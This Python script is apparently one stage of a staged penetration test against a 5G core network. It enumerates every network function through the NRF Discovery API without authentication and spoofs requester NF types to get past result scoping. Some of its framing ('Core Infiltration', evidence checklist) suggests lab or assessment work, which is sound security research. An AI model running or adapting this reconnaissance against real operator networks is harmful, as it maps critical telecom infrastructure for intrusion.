#!/usr/bin/env python3
"""
Stage 4 — Network Service Discovery
Scenario 1: Core Infiltration

Goal: enumerate the full NF topology via NRF's Discovery API, using
whatever network position we have (no prior auth/foothold needed,
since Stage 2a already showed NRF requires none).
"""

import subprocess
import json
from datetime import datetime

NRF_ADDRESS = "192.168.134.128"
NRF_PORT = 7777

# All standard 3GPP NF types worth checking for in a 5G core.
NF_TYPES = [
    "NRF", "AMF", "SMF", "UPF", "AUSF", "UDM", "UDR", "PCF",
    "NSSF", "SCP", "SEPP", "NEF", "NWDAF", "BSF"
]

def curl_json(method, target_url, params=None):
    """Run curl with HTTP/2 prior-knowledge, return (status_code, parsed_json_or_None)."""
    cmd = ["curl", "-s", "-w", "\n%{http_code}", "--http2-prior-knowledge",
           "-X", method, target_url]
    if params:
        query = "&".join(f"{k}={v}" for k, v in params.items())
        cmd[-1] = f"{target_url}?{query}"

    result = subprocess.run(cmd, capture_output=True, text=True)
    output = result.stdout.strip()
    *body_lines, status_code = output.rsplit("\n", 1)
    response_body = "\n".join(body_lines)

    try:
        parsed = json.loads(response_body) if response_body else None
    except json.JSONDecodeError:
        parsed = None

    return int(status_code), parsed

REQUESTER_TYPES_TO_TRY = ["AMF", "UDM", "SMF", "PCF", "SCP", "NRF"]

def discover_nf_type(nf_type):
    """Query NRF for all instances of a given NF type, trying multiple
    requester identities since NRF scopes results by allowedNfTypes."""
    url = f"http://{NRF_ADDRESS}:{NRF_PORT}/nnrf-disc/v1/nf-instances"
    for requester in REQUESTER_TYPES_TO_TRY:
        status, body = curl_json("GET", url, params={
            "target-nf-type": nf_type,
            "requester-nf-type": requester
        })
        if status == 200 and body and body.get("nfInstances"):
            return status, body  # found it, stop trying
    return status, body  # last attempt's result, likely empty


def main():
    print(f"[*] Scenario 1 - Stage 4: Network Service Discovery")
    print(f"[*] Target NRF: {NRF_ADDRESS}:{NRF_PORT}")
    print(f"[*] Timestamp: {datetime.now().isoformat()}\n")

    topology = {}

    for nf_type in NF_TYPES:
        print(f"[*] Querying for {nf_type}...")
        status, body = discover_nf_type(nf_type)

        if status == 200 and body and body.get("nfInstances"):
            instances = body["nfInstances"]
            topology[nf_type] = instances
            print(f"    [+] Found {len(instances)} instance(s)")
            for inst in instances:
                inst_id = inst.get("nfInstanceId", "?")
                addrs = inst.get("ipv4Addresses", [])
                services = inst.get("nfServices", [])
                print(f"        - {inst_id}  addrs={addrs}")
                for svc in services:
                    endpoints = svc.get("ipEndPoints", [])
                    for ep in endpoints:
                        print(f"          service={svc.get('serviceName')} "
                              f"endpoint={ep.get('ipv4Address')}:{ep.get('port')}")
        elif status == 200:
            print(f"    [-] No instances registered")
        else:
            print(f"    [-] Query failed: HTTP {status}")

    # Save the full raw topology to a file for the evidence checklist
    output_path = "topology_dump.json"
    with open(output_path, "w") as f:
        json.dump(topology, f, indent=2)

    print(f"\n[*] Full topology saved to {output_path}")
    print(f"[*] Total NF types found: {len(topology)}")
    total_instances = sum(len(v) for v in topology.values())
    print(f"[*] Total NF instances discovered: {total_instances}")


if __name__ == "__main__":
    main()
